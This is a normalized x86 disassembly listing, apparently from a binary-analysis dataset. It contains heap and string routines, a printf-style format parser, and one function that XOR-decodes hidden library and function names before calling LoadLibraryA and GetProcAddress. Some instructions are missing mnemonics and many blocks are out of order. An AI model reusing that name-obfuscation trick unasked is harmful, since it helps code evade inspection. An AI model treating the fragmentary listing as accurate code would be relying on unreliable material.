lea edx [ ebp - 0x1c ]
push edx
mov ecx esi
call sub_10043190
mov eax [ edi + 0x4 ]
push 0x26
push eax
call sub_1006cda0
mov ecx [ edi + 0x4 ]
push ecx
call sub_1006cb40
mov esi [ ebp - 0xf4 ]
add esp 0x28
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax r--data
jmp r-xdata
xor edx edx
cmp [ ebp - 0xd0 ] esi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] dx
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp [ ebp - 0x7c ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_1006591f
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax r--data
jmp r-xdata
push edi
push r--data
call sub_10016320
add esp 0x8
push ebx
push r--data
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
call sub_10043190
mov esi [ rw-data ]
mov [ ebp - 0x4 ] 0xc
cmp esi [ rw-data ]
je r-xdata
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0xb8 ]
inc esi
push esi
call sub_1004ac7a
push esi
mov edi eax
push ebx
push edi
call sub_10079a10
mov eax [ ebp - 0xc8 ]
mov esi 0x10
add esp 0x10
cmp [ ebp - 0xb4 ] esi
jae r-xdata
lea edx [ ebp - 0xf0 ]
push edx
push 0x6
mov edi 0x10
call sub_100372e0
lea eax [ ebp - 0xf0 ]
add esp 0x8
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xb8 ]
push ecx
push eax
push edi
call sub_100796a0
add esp 0xc
cmp [ ebp - 0xb4 ] esi
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0xf0 ]
push eax
mov ecx esi
call sub_10040200
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ esi + 0x10 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jne r-xdata
mov eax [ esi + 0x10 ]
dec eax
push eax
push 0x1
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx esi
call sub_1004d2f0
lea edx [ ebp - 0xec ]
push edx
push 0x2
mov [ ebp - 0x4 ] 0xd
call sub_100372e0
lea eax [ ebp - 0xec ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edi [ eax + 0x1 ]
xor ecx ecx
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x4
call sub_100372e0
lea eax [ ebp - 0xe8 ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
dec ecx
push ecx
push ebx
lea eax [ ebp - 0xac ]
push eax
mov ecx esi
call sub_1004d2f0
push 0xffffffff
push ebx
lea ecx [ ebp - 0xac ]
push ecx
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x10
call sub_10035d20
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_10043190
lea ecx [ ebp - 0x58 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_100624b0
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0xf
call sub_10035d20
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
mov eax edi
mov edx [ ebp - 0xe4 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0xe8 ]
push ecx
lea ecx [ ebp - 0x58 ]
call sub_10043190
mov [ ebp - 0x4 ] 0x11
cmp [ esi + 0x14 ] edi
jb r-xdata
add esi 0x1c
cmp esi [ rw-data ]
jne r-xdata
mov edx [ ebp - 0xac ]
jmp r-xdata
mov edi 0x10
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1006591f
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edx
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x58 ]
push edx
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_10021390
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x12
call sub_10035d20
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
call sub_1006591f
add esp 0x4
sub_1001215a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10024583
pop ecx
push eax
call sub_1002ec01
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100121d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100807e8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor edi edi
push 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
push edi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x1c ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x1c ] eax
inc [ eax ]
lea esi [ ebx + 0x20 ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ ebp - 0x7c ] esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x4 ] eax
inc [ eax ]
mov esi [ GetProcessHeap@IAT ]
push 0x4
push edi
mov [ ebx + 0x28 ] edi
mov [ ebx + 0x2c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x30 ] edi
mov [ ebx + 0x34 ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ ebx + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x3c ] edi
call esi
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x34
call sub_100050e0
mov eax [ ebx + 0x4 ]
cmp eax edi
je r-xdata
mov [ ebx + 0x3c ] eax
inc [ eax ]
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
mov [ ebx ] ecx
mov esi [ eax + 0x4 ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x100
call sub_100050e0
mov ecx [ ebx + 0xc ]
cmp ecx edi
je r-xdata
push esi
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x48 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push edx
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_100796a0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x14 ] edi
mov esi [ esi + 0x14 ]
cmp esi 0x6
ja r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx edi
je r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0x48 ]
push esi
push edx
push eax
mov [ ebx + 0xc ] eax
call sub_100796a0
mov esi [ ebp - 0x50 ]
add esp 0xc
jmp r-xdata
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0xc ] edi
mov esi [ ebp - 0x50 ]
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x76
call sub_100050e0
mov [ ebx + 0x14 ] esi
jmp r-xdata
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x48 ]
push esi
push ecx
push eax
mov [ ebx + 0x10 ] eax
call sub_100796a0
mov esi [ ebp - 0x50 ]
add esp 0xc
push ecx
call [ LocalFree@IAT ]
mov eax [ ebp - 0x48 ]
mov [ ebx + 0x10 ] edi
mov eax [ esi + 0x10 ]
mov [ ebp - 0x48 ] eax
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
push 0x4
push edi
mov [ ebp - 0x4c ] edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapAlloc@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x48 ] eax
push 0x4
push edi
mov [ ebp - 0x5c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x58 ] eax
push 0x4
push edi
mov [ ebp - 0x64 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x60 ] eax
push 0x4
push edi
mov [ ebp - 0x6c ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
inc [ eax ]
mov [ ebp - 0x68 ] eax
push 0x4
push edi
mov [ ebp - 0x74 ] edi
call [ GetProcessHeap@IAT ]
push eax
call esi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x76
call sub_100050e0
jmp r-xdata
jmp [ eax * 4 + jump_table_10012740 ]
inc [ eax ]
mov [ ebp - 0x70 ] eax
mov eax [ ebx + 0x14 ]
cmp eax 0x6
ja r-xdata
mov [ ebp - 0x4 ] 0x8
mov esi [ ebp - 0x70 ]
dec [ esi ]
cmp [ esi ] edi
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x77
call sub_100050e0
jmp r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x54 ]
call sub_10068700
push eax
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xa
call sub_10048a10
mov edi esi
mov [ ebp - 0x4 ] 0x9
call sub_10045ee0
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x84 ]
call sub_1003adb0
mov ebx eax
lea edi [ ebp - 0x5c ]
call sub_1005ac10
mov edi esi
call sub_1005bb10
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x9c ]
call sub_100571a0
mov edi eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_100683b0
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x9
call sub_10042990
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x94 ]
call sub_1002ce00
mov edi eax
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xc
call sub_100683b0
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x9
call sub_10042990
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x8c ]
call sub_1002b9f0
mov edi eax
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xd
call sub_100683b0
lea esi [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x9
call sub_10042990
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov esi [ HeapFree@IAT ]
mov ecx [ ebp - 0x74 ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x10f
lea edx [ ebp - 0x4c ]
push edx
lea edi [ ebx + 0x18 ]
call sub_10048a10
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x2a
call sub_100050e0
mov ebx [ ebp - 0x78 ]
jmp r-xdata
mov edi [ ebp - 0x7c ]
lea ebx [ ebp - 0x5c ]
call sub_1005ac10
mov ebx [ ebp - 0x78 ]
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x95
jmp r-xdata
lea edi [ ebp - 0x64 ]
lea esi [ ebx + 0x28 ]
call sub_100683b0
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xba
jmp r-xdata
lea edi [ ebp - 0x6c ]
lea esi [ ebx + 0x30 ]
call sub_100683b0
jmp r-xdata
xor edi edi
lea edi [ ebp - 0x74 ]
lea esi [ ebx + 0x38 ]
call sub_100683b0
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x60 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x6c ]
cmp ecx edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapFree@IAT ]
push eax
call esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
call sub_100050e0
mov eax [ ebp - 0x58 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x68 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x48 ]
dec [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x5c ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x60 ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov esi ecx
call sub_10021ec0
mov esi [ HeapFree@IAT ]
mov eax [ ebp - 0x58 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
call sub_100542e0
mov ecx [ ebp - 0x4c ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov ecx [ ebp - 0x48 ]
sub_10012760
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0xca
inc cl
mov [ ebp + eax - 0x24 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x19 ] 0x0
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x40 ] ebx
test ebx ebx
jne r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0x97
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp - 0x7 ] 0x0
call esi
mov [ ebp - 0x44 ] eax
test eax eax
jne r-xdata
push edi
lea edi [ ebp - 0x18 ]
mov eax 0x43
call sub_10009000
mov ecx edi
push ecx
push ebx
call esi
mov ebx eax
test ebx ebx
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x30 ]
mov eax 0xfc
call sub_10009000
mov eax [ ebp - 0x40 ]
mov edx edi
push edx
push eax
call esi
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
lea eax [ ebx + 0x3 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x3c ]
push ecx
push 0xffffffff
push sub_10022ba0
push sub_10033150
push sub_10040fe0
push sub_10030bd0
push sub_10050a20
push sub_1002ead0
push sub_1005d440
call [ ebp - 0x44 ]
mov esi eax
add esp 0x24
test esi esi
jne r-xdata
lea eax [ edi + 0x4 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push sub_1005e5b0
push 0x0
push r--data
push r--data
push esi
call ebx
add esp 0x1c
push esi
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x5 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call edi
mov edx [ ebp - 0x40 ]
add esp 0x4
push edx
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
call edi
add esp 0x4
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10012920
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_100531b0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10012975
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_1006a508
call sub_1004fd6f
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_10024583
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10013589 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_10055531
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_1007a49d
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_1007a49d
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
